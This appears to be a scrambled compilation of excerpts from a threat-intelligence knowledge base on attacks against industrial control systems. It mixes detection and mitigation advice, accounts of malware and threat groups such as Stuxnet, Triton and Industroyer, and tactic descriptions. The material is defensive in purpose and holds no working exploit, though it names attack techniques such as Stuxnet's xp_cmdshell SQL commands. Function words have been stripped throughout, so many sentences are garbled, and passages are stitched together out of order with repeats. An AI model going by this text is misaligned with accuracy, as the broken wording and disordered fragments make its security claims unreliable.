 devices systems changes, including administrative functions, require authentication. access management technologies enforce authorization management interface access attempts, device inherently provide strong authentication authorization functions.
 Ensure SIS segmented operational networks prevent targeted additional adversarial behavior.
 Monitor device application logs program changed, devices produce logs. [OilRig](https://attack.mitre.org/groups/G0049) communicated command control requests. (Citation: Robert Falcone, Bryan Lee 2016) Ensure anti-virus solution detect malicious files user execution Office Macros, program installers).
 Monitor asset log provide asset Firmware Update Mode. assets log firmware updates logging device update mode. [Dragonfly 2.0](https://attack.mitre.org/groups/G0035) leveraged compromised user credentials access targets networks download tools remote server. (Citation: Dragos) (Citation: Cybersecurity & Infrastructure Security Agency March 2018) [WannaCry](https://attack.mitre.org/software/S0366) laterally industrial networks SMB service. (Citation: Joe Slowik April 2019) utilize hardware software root-of-trust verify authenticity system. achieved cryptographic means, digital signatures hashes, critical software firmware supply chain.
 Monitor attempts enable scripts running considered suspicious. scripts commonly system, enabled, scripts running cycle patching administrator functions suspicious. Scripts captured file determine actions intent. [Triton](https://attack.mitre.org/software/S1009) leverages reconstructed TriStation protocol framework trigger APIs program download, program allocation, program changes. (Citation: Jos Wetzels January 2018) transportation organizations Ukraine suffered infected [Bad Rabbit](https://attack.mitre.org/software/S0606), computers encrypted, media reports. (Citation: Marc-Etienne M.Lveill October 2017) [Triton](https://attack.mitre.org/software/S1009) capability reprogram SIS logic unsafe conditions persist reprogram SIS unsafe  DCS create unsafe hazard. (Citation: Blake Johnson, Dan Caban, Marina Krotofil, Dan Scali, Nathan Brubaker, Christopher Glyer December 2017) Network allowlists implemented host-based files host files external connections IP address, MAC address, port, protocol) device. Allowlist techniques operate application layer DNP3, Modbus, HTTP) addressed [Filter Network Traffic](https://attack.mitre.org/mitigations/M0937) mitigation. [INCONTROLLER](https://attack.mitre.org/software/S1045) deploy Tcpdump sniff network traffic collect PCAP files.(Citation: Wylie-22)  disabling features AutoRun.
 [Backdoor.Oldrea](https://attack.mitre.org/software/S0093) payload caused multiple common OPC platforms intermittently crash. denial service applications reliant OPC communications. (Citation: ICS-CERT August 2018) Monitor user accounts logged systems access abnormal access patterns, multiple systems short period time. Correlate login activity remote services unusual behavior malicious suspicious activity. [Remote Services](https://attack.mitre.org/techniques/T0886) access host’s GUI. [BlackEnergy](https://attack.mitre.org/software/S0089) targeted energy sector organizations wide reaching email spearphishing campaign. Adversaries utilized malicious Word documents attachments. (Citation: Booz Allen Hamilton)
 Monitor behaviors endpoint successful compromise, abnormal behaviors browser processes. include suspicious files written disk. Monitor anomalies discovery ICS functions, including devices functions functions outstations. Note ICS protocols broadcast multicast functionality, produce false positives. monitor hosts enumerating network connected resources non-ICS enterprise protocols. Protocols control functions provide authenticity MAC functions digital signatures. not, utilize bump-in-the-wire devices VPNs enforce communication authenticity devices capable supporting legacy controllers, RTUs).
 Ukraine 2015 Incident, [Sandworm Team](https://attack.mitre.org/groups/G0034) blocked command messages malicious firmware render communication devices inoperable. (Citation: Electricity Sharing Analysis Center; SANS Industrial Control Systems March 2016) strong multi-factor authentication remote service accounts mitigate adversary's ability leverage stolen credentials. aware ofmulti-factor authentication interceptiontechniques implementations.
 Filter protocols payloads firmware activation updating activity.
 Monitor application logs settings events network protocols services commonly abused AiTM. store data backups user systems critical servers. Ensure backup storage systems hardened separate corporate network prevent compromise.  Maintain exercise incident response plans  (Citation: Department Homeland Security October 2009), including management gold-copy back-up images configurations key systems enable quick recovery response adversarial activities impact control, view, availability.
 APIs remote systems local processes require authentication users executing code changes.
 irregular network traffic flows unwanted devices sessions wireless networks. Wi-Fi networks monitor rogue access signal strength, indicating device access expected physical layer signal.(Citation: Nzyme Alerts Intro) (Citation: Wireless Intrusion Detection) Network traffic content provide context, hardware MAC) addresses, user accounts, types messages sent. Statically defined ARP entries prevent manipulation sniffing switched network traffic, MitM techniques depend sending spoofed ARP messages manipulate network host's dynamic ARP tables.
 Monitor unusual logins Internet connected devices unexpected protocols to/from Internet. Network traffic content provide valuable context details content network flows. [Stuxnet](https://attack.mitre.org/software/S0603) copies Step 7 projects automatically executes Step 7 project loaded. (Citation: Nicolas Falliere, Liam Murchu, Eric Chien February 2011) Monitor authentication logs analyze unusual access patterns, windows activity, access normal business hours, including [Valid Accounts](https://attack.mitre.org/techniques/T0859). Prevent unsigned executables, installers scripts.
 Verify integrity live processes comparing code memory static binaries, checking jumps instructions redirect code flow. [Backdoor.Oldrea](https://attack.mitre.org/software/S0093) RAT distributed trojanized installer attached emails. (Citation: Daavid Hentunen, Antti Tikkanen June 2014) Update software regularly employing patch management internal enterprise endpoints servers.
 Collect file hashes. Monitor file names match expected hash. Perform file monitoring. Files names unusual locations suspect.  indications common characters attempt trick users misidentifying file type, space character file right-to-left override characters"\u202E", "[U+202E]", "%E2%80%AE". context adversary procedures background [Masquerading](https://attack.mitre.org/techniques/T1036) applicable sub-techniques. Monitor operational data indicators temporary data loss Denial Service. detect technique’s execution, provide additional evidence technique complement detections. [Stuxnet](https://attack.mitre.org/software/S0603) manipulates view operators replaying process input manipulating I/O image evade detection inhibit protection functions. (Citation: Ralph Langner November 2013) (Citation: Nicolas Falliere, Liam Murchu, Eric Chien February 2011) [REvil](https://attack.mitre.org/software/S0496) SMB protocol encrypt files located remotely connected file shares. (Citation: Max Heinemeyer February 2020) [INCONTROLLER](https://attack.mitre.org/software/S1045) wipe memory Omron PLCs reset settings remote service.(Citation: Brubaker-Incontroller)(Citation: Dragos-Pipedream)(Citation: Wylie-22)  Monitor ICS protocol connections existing assets device scanning (i.e., host connecting devices) ICS enterprise protocols ICMP, DCOM, WinRM). context adversary enterprise procedures background [Remote Discovery](https://attack.mitre.org/techniques/T1018). Utilize exploit protection prevent activities exploited malicious sites.
 Monitor executed commands arguments actions aid sniffing network traffic capture environment. Protection devices minimal digital components prevent exposure adversarial techniques. Examples include interlocks, rupture disks, release valves, etc. (Citation: Foord, Gulland, Howard, Kellacher, Smith 2004) 
 field controllers restrict modification programs users engineers, field technician), preferably implementing role-based access mechanism.
 Segment operational network systems restrict access critical functions predetermined management systems. (Citation: Department Homeland Security September 2016)
 Application isolation limit processes features exploited target access. Examples built features software restriction policies, AppLocker Windows, SELinux AppArmor Linux.
 Hot-standbys diverse locations ensure continued operations compromised unavailable. network layer, protocols Parallel Redundancy Protocol simultaneously redundant diverse communication local network. (Citation: M. Rentschler H. Heine)
 devices systems changes, including administrative functions, require authentication. access management technologies enforce authorization management interface access attempts, device inherently provide strong authentication authorization functions.
 authentication required access exposed remote service, monitor follow-on activities anomalous external exposed API application. Minimize permissions access service accounts limit impacted malicious users software. (Citation: National Institute Standards Technology April 2013)
 [Oldsmar Treatment Plant Intrusion](https://attack.mitre.org/campaigns/C0009), threat actors gained access remote access software, allowing standard operator HMI interface.(Citation: Pinellas County Sheriffs Office February 2021) [Triton](https://attack.mitre.org/software/S1009) disables firmware RAM/ROM consistency check injects payload (imain.bin) firmware memory region. (Citation: DHS CISA February 2019) (Citation: ICS-CERT December 2018) (Citation: Schneider Electric January 2018) Triconex systems include continuous detection including checksums firmware program integrity, memory memory reference integrity, configuration. (Citation: Office Nuclear Reactor Regulation) Monitor ICS automation protocols functions restart shutdown device. Commands restart shutdown devices observable traditional management protocols. Configure features account login attempt lockouts, specific login times, password strength requirements examples. features relate assets impact safety availability. (Citation: Keith Stouffer 2015)
 Segment operational network systems restrict access critical functions predetermined management systems. (Citation: Department Homeland Security September 2016)
 [Stuxnet](https://attack.mitre.org/software/S0603) executes malicious SQL commands WinCC database server propagate remote systems. malicious SQL commands include xp_cmdshell, sp_dumpdbilog, sp_addextendedproc. (Citation: Nicolas Falliere, Liam Murchu, Eric Chien February 2011) Monitor newly constructed files written disk user visiting normal browsing. [Sandworm Team](https://attack.mitre.org/groups/G0034) establishes internal proxy prior installation backdoors network. (Citation: Dragos June 2017) Protocols device management authenticate network messages prevent unauthorized changes.
 Authenticate access field controllers authorizing access to, modification of, device's state, logic, programs. Centralized authentication techniques manage field controller accounts ICS.
 Provide operators redundant, out-of-band communication support monitoring control operational processes, recovering network outage  (Citation: National Institute Standards Technology April 2013). Out-of-band communication utilize diverse systems technologies minimize common failure modes vulnerabilities communications infrastructure. example, wireless networks 3G, 4G) provide diverse redundant delivery data.
 Monitor newly constructed scheduled jobs attempt manipulate features artifacts legitimate benign users security tools. [Bad Rabbit](https://attack.mitre.org/software/S0606) disguised Adobe Flash installer. file starts locking infected computer. (Citation: Orkhan Mamedov, Fedor Sinitsyn, Anton Ivanov October 2017) deep packet inspection artifacts common exploit traffic, payloads. [REvil](https://attack.mitre.org/software/S0496) utilizes JavaScript, WScript, PowerShell scripts execute. malicious JavaScript attachment obfuscated PowerShell script executes malware. (Citation: Tom Fakterman August 2019) [BlackEnergy](https://attack.mitre.org/software/S0089) utilizes valid user administrator credentials, addition creating administrator accounts maintain presence. (Citation: Booz Allen Hamilton)
 Filter protocols payloads firmware activation updating activity.
 store data backups user systems critical servers. Ensure backup storage systems hardened separate corporate network prevent compromise.  Maintain exercise incident response plans  (Citation: Department Homeland Security October 2009), including management gold-copy back-up images configurations key systems enable quick recovery response adversarial activities impact control, view, availability.
 configuration network-wide authentication service Active Directory, LDAP, RADIUS capabilities ICS devices. (Citation: Keith Stouffer 2015) (Citation: Schweitzer Engineering Laboratories August 2015)
 field controllers restrict operating mode required authenticated users engineers, field technicians), preferably implementing role-based access mechanism. Further, physical mechanisms keys) limit unauthorized operating mode changes.
 [Dragonfly](https://attack.mitre.org/groups/G0035) trojanized legitimate ICS equipment providers software packages download websites.(Citation: Symantec Security Response July 2014) Access Management technologies enforce authorization policies decisions, existing field devices provide capabilities support user identification authentication. (Citation: McCarthy, al. July 2018) technologies typically utilize in-line network device gateway prevent access unauthenticated users, integrating authentication service verify user credentials.
 host-based allowlists prevent devices accepting connections unauthorized systems. example, allowlists ensure devices connect master stations management/engineering workstations. (Citation: Department Homeland Security September 2016)
 peripheral output written to, sequence intercepts output ensures written process image output. output instructions PLC sends device change operating behavior. intercepting peripheral output, [Stuxnet](https://attack.mitre.org/software/S0603) prevents operator noticing unauthorized commands peripheral. (Citation: Nicolas Falliere, Liam Murchu, Eric Chien February 2011) Filter application-layer protocol messages remote services block unauthorized activity.
 [Stuxnet](https://attack.mitre.org/software/S0603)'s rootkits contained fake s7otbxdx.dll. continue existing undetected PLC account situations: read requests malicious code blocks, read requests infected blocks (OB1, OB35, DP_RECV), write requests overwrite Stuxnets code. Stuxnet code monitor intercept types requests. rootkit modifies requests Stuxnets PLC code discovered damaged. (Citation: Ralph Langner November 2013) Monitor alarms operating mode changed, devices produce logs. Segment operational network systems restrict access critical functions predetermined management systems. (Citation: Department Homeland Security September 2016)
 devices systems changes, including administrative functions, require authentication. access management technologies enforce authorization management interface access attempts, device inherently provide strong authentication authorization functions.
 DP_RECV standard function block network coprocessors. receive network frames Profibus  standard industrial network bus distributed I/O. original block copied FC1869, replaced malicious block. time function receive packet, malicious [Stuxnet](https://attack.mitre.org/software/S0603) block takes control: original DP_RECV FC1869 perform postprocessing packet data. replaced DP_RECV block (later referred DP_RECV monitor) meant monitor data frequency converter drives 315-2 CPU CP 342-5 Profibus communication modules. (Citation: Nicolas Falliere, Liam Murchu, Eric Chien February 2011) Monitor loss expected operational process alarms alarms suppressed. technique description, multiple sources alarms ICS environment. Discrepancies alarms adversary suppressing alarms environment.  detect technique’s execution, provide additional evidence technique complement detections. Monitor firmware unexpected changes. Asset management systems consulted understand known-good firmware versions. Dump inspect BIOS images vulnerable systems compare images.(Citation: MITRE Copernicus) Analyze differences determine malicious occurred. Log attempts read/write BIOS compare patching behavior. Likewise, EFI modules collected compared known-clean list EFI executable binaries detect malicious modules. CHIPSEC framework analysis determine firmware modifications performed.(Citation: McAfee CHIPSEC Blog) (Citation: Github CHIPSEC) (Citation: Intel HackingTeam UEFI Rootkit) [Industroyer](https://attack.mitre.org/software/S0604) contained module leveraged vulnerability Siemens SIPROTEC relays (CVE-2015-5374) create Denial Service automated protective relays. (Citation: Dragos October 2018) Develop robust cyber threat intelligence capability determine types levels threat software exploits 0-days organization.
 field controllers require users authenticate remote local management sessions. authentication mechanisms support [Account Policies](https://attack.mitre.org/mitigations/M0936), [Password Policies](https://attack.mitre.org/mitigations/M0927), [User Account Management](https://attack.mitre.org/mitigations/M0918). Develop publish policies define acceptable stored repositories.
 Monitor master devices communicating outstation assets, visible asset application logs. [Triton](https://attack.mitre.org/software/S1009) communicate implant utilizing TriStation 'get main processor diagnostic data' command crafted packet body extracts command arguments. (Citation: Jos Wetzels January 2018) [OilRig](https://attack.mitre.org/groups/G0049) utilized stolen credentials gain access victim machines.(Citation: Dragos) Monitor collection assets deviations standard operational tools. Examples include unexpected industrial automation protocol functions, volume communication sessions, broad collection hosts network.  [Dragonfly 2.0](https://attack.mitre.org/groups/G0035) communicated command control TCP ports 445 139 UDP 137 138. (Citation: Cybersecurity & Infrastructure Security Agency March 2018) Communication authenticity ensure messages tampered MITM detected, prevent eavesdropping these. addition, providing communication authenticity discovery protocols, DNS, prevent MITM procedures.
 file access controls protect application folders.
 detecting collection local systems monitor newly executed processes search local sources, file systems local databases, files sensitive data prior Exfiltration. context adversary procedures background [Data Local System](https://attack.mitre.org/techniques/T1005). [OilRig](https://attack.mitre.org/groups/G0049) utilizing watering hole attacks collect credentials gain access ICS networks. (Citation: Eduard Kovacs 2018) Authenticate connections software devices prevent unauthorized systems accessing protected management functions.
 Monitor network traffic ICS functions write commands excessive I/O manipulating single excessive times. Unauthorized connections prevented statically defining hosts ports automation protocol connections.
 Monitor unexpected ICS protocol command functions controllers existing master devices (including processes) devices. detection [Rogue Master](https://attack.mitre.org/techniques/T0848) requires ICS function level insight determine unauthorized device issuing commands historian).

Monitoring unexpected problematic values function level provide insights malicious activity cost additional false positives depending underlying operational process. Review integrity project files verify modified adversary behavior. Verify cryptographic hash file trusted version, indicators modification timestamps).
 code signing project files stored rest prevent unauthorized tampering. Ensure signing easily accessible system.
 field controllers require users authenticate remote local management sessions. authentication mechanisms support [Account Policies](https://attack.mitre.org/mitigations/M0936), [Password Policies](https://attack.mitre.org/mitigations/M0927), [User Account Management](https://attack.mitre.org/mitigations/M0918). Monitor executed commands arguments binaries involved data destruction activity, SDelete. Monitor ICS management protocols / file transfer protocols protocol functions firmware changes. Monitor network traffic originating unknown/unexpected hosts. Local network traffic metadata (such source MAC addressing) usage network management protocols DHCP helpful identifying hardware. [ALLANITE](https://attack.mitre.org/groups/G1000) leverages watering hole attacks gain access electric utilities. (Citation: Eduard Kovacs 2018) Monitor analyze traffic patterns packet inspection web-based network connections malicious suspicious destinations destinations attributed phishing campaigns). correlation process monitoring command detect anomalous processes execution command arguments monitor anomalies files initiate network connections unusual connections initiated regsvr32.exe, rundll.exe, SCF, HTA, MSI, DLLs, msiexec.exe). Segment externally facing servers services rest network DMZ separate hosting infrastructure.
 Restrict browsers limit capabilities malicious ads Javascript.
 Collecting I/O image requires analyzing application program running PLC specific data block reads. Detecting requires obtaining analyzing PLC’s application program, device asset management platforms. Monitor newly constructed network connections untrusted hosts send receive data. Monitor lack operational process data identify loss communications. detect technique’s execution, provide additional evidence technique complement detections. Restrict configurations firmware updating abilities authorized individuals.
 [Bad Rabbit](https://attack.mitre.org/software/S0606) laterally industrial networks SMB service. (Citation: Joe Slowik April 2019) includes list process alarms alerts produced unusual activity operational process increased temperature/pressure) includes sources current expected software application programs deployed device, version patch level vendor products, source code application programs, unique identifiers hashes, signatures). includes data stores maintain historical real-time events telemetry recorded sensors devices includes alarms unexpected device functions, shutdowns, restarts, failures, configuration includes sources current expected devices network, including manufacturer, model, identifiers IP hardware addresses) Operational databases status operational process devices, including measurements, events, history, alarms occurred Data sources set devices network, current software configurations ATT&CK ICS Matrix includes techniques spanning ICS assets navigate knowledge base. adversary prevent safety, protection, quality assurance, operator intervention functions responding failure, hazard, unsafe state.

Inhibit Response Function consists techniques adversaries hinder safeguards processes products. involve inhibition safety, protection, quality assurance, operator intervention functions disrupt safeguards aim prevent loss life, destruction equipment, disruption production. techniques aim actively deter prevent expected alarms responses statuses ICS environment. Adversaries modify update logic, outright prevent responses denial-of-service. result prevention, destruction, manipulation, modification programs, logic, devices, communications. prevention functions dormant, reporting processing functions fine, altered prevent failure responses dangerous scenarios. [Evasion](https://attack.mitre.org/tactics/TA0103), Inhibit Response Function techniques intrusive, actively preventing responses dangerous scenario. Adversaries techniques follow provide cover [Impact](https://attack.mitre.org/tactics/TA0105) techniques. adversary gain higher-level permissions.

Privilege Escalation consists techniques adversaries gain higher-level permissions network. Adversaries enter explore network unprivileged access require elevated permissions follow objectives. Common approaches advantage weaknesses, misconfigurations, vulnerabilities. adversary ICS environment.

Lateral Movement consists techniques adversaries enter control remote systems network. techniques abuse default credentials, accounts, vulnerable services, leverage dual-homed devices systems reside OT networks. adversary techniques pivot environment, positioning be. primary objective requires [Discovery](https://attack.mitre.org/tactics/TA0102) network [Collection](https://attack.mitre.org/tactics/TA0100) develop awareness unique ICS devices processes, target subsequently gain access it. Reaching objective involves pivoting multiple systems, devices, accounts. Adversaries install remote tools accomplish Lateral Movement leverage default tools, programs, manufacturer set legitimate credentials native network, stealthier. adversary locating assess identify targets environment.

Discovery consists techniques adversaries survey ICS environment gain knowledge internal network, control devices, processes interact. techniques adversaries observe environment determine steps target selection Lateral Movement. adversaries explore control gain insight interactions control processes. Discovery techniques progression environment enable adversary orient deciding act. Adversaries Discovery techniques result Collection, determine resources benefit current objective. combination native device communications functions, custom tools post-compromise information-gathering objective. adversary ICS environment.

Initial Access consists techniques adversaries entry vectors gain initial foothold ICS environment. techniques include compromising operational technology assets, resources OT network, external remote services websites. target party entities users privileged access. particular, initial access footholds include devices communication mechanisms access privileges OT environments. resources OT environment vulnerable attacks enterprise systems. Trusted parties concern include vendors, maintenance personnel, engineers, external integrators, entities involved expected ICS operations. Vendor maintained assets include physical devices, software, operational equipment. Initial access techniques leverage devices, radios, controllers, removable media, remotely interfere infect OT operations. adversary manipulate, interrupt, destroy ICS systems, data, surrounding environment.

Impact consists techniques adversaries disrupt, compromise, destroy, manipulate integrity availability control operations, processes, devices, data. techniques encompass influence effects adversarial efforts attack ICS environment tangentially impact it. Impact techniques result instantaneous disruption control processes operator, result term damage loss ICS environment operations. adversary leverage [Impair Process Control](https://attack.mitre.org/tactics/TA0106) techniques, manifest self-revealing impacts operations, [Inhibit Response Function](https://attack.mitre.org/tactics/TA0106) techniques hinder safeguards alarms follow provide cover Impact. scenarios, control processes function expected, altered benefit adversary’s goal duration. techniques adversaries follow goal provide cover confidentiality breach.

[Loss Productivity Revenue](https://attack.mitre.org/techniques/T0828), [Theft Operational Information](https://attack.mitre.org/techniques/T0882), [Damage Property](https://attack.mitre.org/techniques/T0879) meant encompass granular goals adversaries targeted untargeted attacks. techniques detectable, adversary behavior mitigated detected. adversary maintain foothold ICS environment.

Persistence consists techniques adversaries maintain access ICS systems devices restarts, changed credentials, interruptions cut access. Techniques persistence include access, action, configuration secure ongoing activity foothold systems. include replacing hijacking legitimate code, firmware, project files, adding startup code downloading programs devices. adversary code manipulate functions, parameters, data unauthorized way.

Execution consists techniques result adversary-controlled code running local remote system, device, asset. execution rely unknowing users manipulation device operating modes run. Adversaries infect remote targets programmed executables malicious project files operate behavior alter expected device behavior subtle ways. Commands execution issued command-line interfaces, APIs, GUIs, interfaces. Techniques malicious code paired techniques tactics, aid network [Discovery](https://attack.mitre.org/tactics/TA0102) [Collection](https://attack.mitre.org/tactics/TA0100), impact operations, inhibit response functions. adversary communicate control compromised systems, controllers, platforms access ICS environment.

Command Control consists techniques adversaries communicate send commands compromised systems, devices, controllers, platforms specialized applications ICS environments. Examples specialized communication devices include human machine interfaces (HMIs), data historians, SCADA servers, engineering workstations (EWS). Adversaries seek commonly resources mimic expected network traffic avoid detection suspicion. instance, commonly ports protocols ICS environments, expected resources, depending target network. Command Control established varying degrees stealth, depending victim’s network structure defenses. adversary gather data domain knowledge ICS environment inform goal.

Collection consists techniques adversaries gather domain knowledge contextual feedback ICS environment. tactic performed [Discovery](https://attack.mitre.org/tactics/TA0102), compile data control systems targets follow adversary’s objective. Examples techniques include observing operation states, capturing screenshots, identifying unique device roles, gathering diagram schematics. Collection data play key role planning, executing, revising ICS-targeted attack. Methods collection depend categories data targeted, include protocol specific, device specific, process specific configurations functionality. collected pertain combination system, supervisory, device, network data, conceptually fall high, medium, levels plan operations. example, repositories plant data level device specific programs level. Sensitive floor plans, vendor device manuals, references risk exposed internet publicly accessible. adversary avoid security defenses.

Evasion consists techniques adversaries avoid technical defenses campaign. Techniques evasion include removal indicators compromise, spoofing communications, exploiting software vulnerabilities. Adversaries leverage abuse trusted devices processes hide activity, masquerading master devices native software. Methods defense evasion purpose passive nature. adversary manipulate, disable, damage physical control processes.

Impair Process Control consists techniques adversaries disrupt control logic determinantal effects processes controlled target environment. Targets include active procedures parameters manipulate physical environment. techniques include prevention manipulation reporting elements control logic. adversary modified process functionality, obfuscate results, self-revealing impact outcome product environment. direct physical control techniques exert threaten safety operators downstream users, prompt response mechanisms. Adversaries follow [Inhibit Response Function](https://attack.mitre.org/tactics/TA0107) techniques tandem, assist successful abuse control processes result [Impact](https://attack.mitre.org/tactics/TA0105). 